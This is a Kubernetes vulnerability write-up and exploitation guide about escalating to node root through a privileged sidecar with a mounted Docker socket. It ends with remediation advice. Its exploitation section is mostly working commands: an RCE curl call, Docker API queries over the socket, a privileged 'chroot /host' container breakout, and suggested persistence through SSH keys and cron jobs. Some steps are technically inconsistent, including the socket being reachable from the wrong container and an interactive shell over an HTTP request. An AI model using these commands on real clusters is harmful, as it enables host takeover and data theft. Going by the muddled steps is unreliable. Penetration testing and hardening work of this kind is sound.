
# Kubernetes Vulnerability: Privileged Escalation via Sidecar Containers

## 1. Overview

This document describes a vulnerability that allows an attacker to escalate privileges within a Kubernetes cluster by leveraging misconfigured or overly permissive sidecar containers.  Specifically, we will focus on scenarios where a sidecar container, intended for monitoring or logging, is granted excessive privileges (e.g., root user inside the container, mounted Docker socket, access to host network) and deployed alongside a vulnerable application container. An attacker can abuse the sidecar's elevated permissions to gain control over the entire node, and potentially the cluster itself.

### Attack Vector Description

The attack involves first identifying a pod running a vulnerable application alongside a sidecar container with excessive privileges.  The attacker then finds a way to execute commands within the application container (e.g., via a known application vulnerability, RCE). From within the application container, the attacker interacts with the privileged sidecar container to execute commands with elevated privileges, potentially accessing the host filesystem, Docker socket, or network interfaces.

### Potential Impact and Consequences

*   **Node Compromise:** The attacker can gain root access on the underlying Kubernetes node.
*   **Data Exfiltration:** The attacker can access and exfiltrate sensitive data stored on the node or within the Kubernetes cluster.
*   **Cluster Takeover:** If the compromised node has cluster administration privileges or if the attacker can leverage the compromised node to access cluster secrets, they can potentially take over the entire Kubernetes cluster.
*   **Denial of Service:** The attacker can disrupt services running on the compromised node or within the cluster.

### Risk Level Assessment

**Critical** - Due to the potential for complete cluster compromise and widespread impact.

### Technical Explanation

This vulnerability arises because Kubernetes allows developers to run multiple containers within a single pod. Sidecar containers are often used to augment the functionality of the main application container, such as logging, monitoring, or data synchronization. However, if a sidecar container is configured with excessive privileges (e.g., `privileged: true`, mounting the Docker socket, running as root), it can become an attack vector.  The attacker exploits a vulnerability in the main application container to gain initial access, and then uses the privileged sidecar container as a stepping stone to escalate privileges and gain control over the underlying node.  Kubernetes does not sufficiently isolate containers within a pod when one container has escalated privileges.

### Prerequisites and Conditions Needed

*   **Vulnerable Application:**  A vulnerable application deployed within a Kubernetes pod (e.g., vulnerable web application susceptible to Remote Code Execution (RCE)).
*   **Privileged Sidecar Container:** A sidecar container deployed alongside the vulnerable application with excessive privileges (e.g., Docker socket mount, `privileged: true`, running as root user).  Often, these are logging or monitoring agents given broad permissions.
*   **Network Access:** Network access to the vulnerable application from the attacker's machine.
*   **Kubectl access (optional):** Useful, but not strictly required if other tooling is available to interact with the cluster (e.g., `curl` and the Kubernetes API).

## 2. Validation and Exploitation Steps

The following steps detail how to validate and exploit the vulnerability. This assumes the presence of a vulnerable web application with RCE alongside a sidecar container mounting the Docker socket.

**Phase 1: Validation & Discovery**

1.  **Identify Pods:**

    ```bash
    kubectl get pods -n <namespace> -o wide
    ```

    **Explanation:** This command lists all pods in the specified namespace along with their node assignment and IP addresses.

    **Expected Output:** A table showing the pods, their status, node, and IP addresses.  Look for pods that appear to be running both an application and a sidecar (e.g., a pod with multiple containers running a web app and a log collector).

    **Why:** To identify candidate pods for further investigation. The `-o wide` option provides more information, including the node each pod is running on.

2.  **Describe Pod and Inspect Container Configurations:**

    ```bash
    kubectl describe pod <pod_name> -n <namespace>
    ```

    **Explanation:** This command retrieves detailed information about the specified pod.

    **Expected Output:** Detailed information about the pod, including the container definitions.

    **Why:**  To examine the configuration of each container within the pod, particularly the sidecar container. Look for the following indicators of excessive privileges:
    *   `securityContext: privileged: true`
    *   Volume mounts including `/var/run/docker.sock`
    *   `securityContext: runAsUser: 0` (running as root)
    *   `hostNetwork: true`

    Example output segment suggesting vulnerability:
    ```yaml
    Containers:
      sidecar:
        Image: busybox:latest
        Security Context:
          Privileged:  true
        Volume Mounts:
          /var/run/docker.sock from docker-socket (rw)
    ```
3.  **Identify a Vulnerability in the Application Container:**

    This step depends on the specific application running within the container. Common vulnerabilities to look for include:

    *   **Remote Code Execution (RCE):** Via command injection, deserialization vulnerabilities, or other attack vectors.
    *   **Server-Side Request Forgery (SSRF):**  To interact with the Kubernetes API server or internal services.
    *   **File Inclusion:** To read sensitive files from the container's filesystem.

    For demonstration, let's assume the application has an RCE vulnerability. We will not explicitly demonstrate this exploitation here but assume it exists and leads to code execution.

    **Why:**  The RCE is the entry point into the pod. It allows us to execute commands within the application container and eventually leverage the sidecar.

**Phase 2: Exploitation**

Now that we have identified a vulnerable pod and an entry point (RCE), we can exploit the privileged sidecar container.  The following steps assume we can execute commands within the application container.

1.  **Execute Command in Application Container (via RCE):**

    This step uses the discovered RCE to execute a command within the application container.  The specific command will depend on the application and the RCE vulnerability.

    **Example (assuming a simple HTTP GET-based RCE):**
    Assuming there is a vulnerability in `/vuln` route to execute commands, we use curl to trigger the RCE.

    ```bash
    curl "http://<application_ip>:<application_port>/vuln?cmd=whoami"
    ```

    **Explanation:** This command sends an HTTP GET request to the `/vuln` endpoint with the `cmd` parameter set to `whoami`.

    **Expected Output:** The username of the user running the application container (likely `www-data` or similar).

    **Why:** To verify that we can execute commands within the application container. This serves as a proof of concept for the RCE vulnerability.
2.  **Leverage the Docker Socket Mount (if present):**

    If the sidecar container mounts the Docker socket (`/var/run/docker.sock`), we can use it to interact with the Docker daemon on the host.

    *   **Option 1:  Using `docker` CLI (if available inside the application container or sidecar):**

        ```bash
        curl "http://<application_ip>:<application_port>/vuln?cmd=docker ps"
        ```

        **Explanation:** This command attempts to list the running containers using the Docker CLI. This assumes the `docker` CLI is present in the compromised container.  This is unlikely, so the next option is preferred.

        **Expected Output:** Information about the running Docker containers.

        **Why:** To verify that we can access the Docker daemon and interact with containers on the host.

    *   **Option 2: Using `curl` and the Docker API:**

        This is the more likely and reliable method if the `docker` CLI is not available.

        ```bash
        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
        ```

        **Explanation:** This command uses `curl` to interact with the Docker API via the Unix socket.  It retrieves information about all running containers.  This command is executed *inside* the compromised container using the RCE vulnerability.  Thus, the full command to trigger the exploit would be something like:

        ```bash
        curl "http://<application_ip>:<application_port>/vuln?cmd=curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"
        ```
        **Expected Output:** A JSON response containing information about the running Docker containers.

        **Why:** To confirm that we can interact with the Docker API directly. The `--unix-socket` parameter is crucial for connecting to the Docker socket.

3.  **Run a Privileged Container on the Host:**

    We can now leverage the Docker socket to run a privileged container that shares the host's namespaces. This effectively gives us root access on the host.

    ```bash
    curl "http://<application_ip>:<application_port>/vuln?cmd=docker run -it --rm --privileged --net=host -v /:/host busybox chroot /host"
    ```

    **Explanation:**  This command instructs the Docker daemon to run a new container with the following properties:
        *   `-it`:  Interactive terminal.
        *   `--rm`: Remove the container after it exits.
        *   `--privileged`:  Run the container with all capabilities.
        *   `--net=host`:  Share the host's network namespace.
        *   `-v /:/host`:  Mount the host's root filesystem to `/host` inside the container.
        *   `busybox`:  The image to use (a minimal Linux distribution).
        *   `chroot /host`:  Change the root directory to the host's filesystem.

    The entire command is executed via the RCE in the application container.

    **Expected Output:** A root shell prompt (e.g., `#`) inside the container.

    **Why:** This command effectively breaks out of the container and gives us root access to the host. By chrooting into the host's filesystem, we can modify any file on the system.

4.  **Verify Root Access on the Host:**

    ```bash
    whoami
    ```

    **Explanation:** This command prints the current user's name.

    **Expected Output:** `root`

    **Why:** To confirm that we are running as root on the host.

5.  **Persistence (Optional):**

    From here, the attacker can establish persistence on the node. Examples include:
        *   Adding an SSH key to the root user's `authorized_keys` file.
        *   Creating a cron job to execute malicious code periodically.
        *   Modifying system startup scripts to run malicious code.

**Alternative Approaches:**

*   **If the sidecar container runs as root without mounting the Docker socket:** The attacker can potentially use `nsenter` to enter the host's namespaces and gain root access.  This requires `nsenter` to be present in the sidecar container (unlikely).
*   **Leveraging the Kubernetes API (if accessible):**  If the attacker can access the Kubernetes API from within the application container (e.g., via SSRF), they can create new pods with escalated privileges or retrieve secrets.

## Remediation Recommendations

*   **Least Privilege:**  Grant sidecar containers only the minimum necessary permissions. Avoid running them as root or with excessive capabilities.
*   **Drop Capabilities:** Use `securityContext` to drop unnecessary capabilities from containers.
*   **Pod Security Policies/Pod Security Admission:** Enforce security policies at the cluster level to restrict the creation of pods with privileged containers.
*   **AppArmor/Seccomp:** Use AppArmor or Seccomp profiles to further restrict the actions that a container can perform.
*   **Regular Vulnerability Scanning:** Regularly scan your application and container images for vulnerabilities.
*   **Auditing:** Implement comprehensive auditing to detect and respond to suspicious activity.
*   **Immutable Infrastructure:** Use immutable infrastructure principles to reduce the attack surface.  Any configuration should be deployed once, not modified while running.
*   **Network Segmentation:** Use network policies to restrict network traffic between pods and namespaces.
*   **Proper Configuration Validation:** Ensure container configurations are validated before deployment to prevent misconfigurations that could lead to privilege escalation.
*   **Keep Kubernetes Updated:** Keep your Kubernetes cluster and its components up to date to patch known vulnerabilities.
*   **Monitor Sidecar Containers:** Carefully monitor the resource usage and activity of sidecar containers to detect any suspicious behavior.

This detailed documentation provides a comprehensive guide to understanding and exploiting the privileged escalation through sidecar containers vulnerability in Kubernetes. The provided steps, explanations, and remediation recommendations will assist penetration testers, security engineers, and developers in identifying, mitigating, and preventing this critical vulnerability.
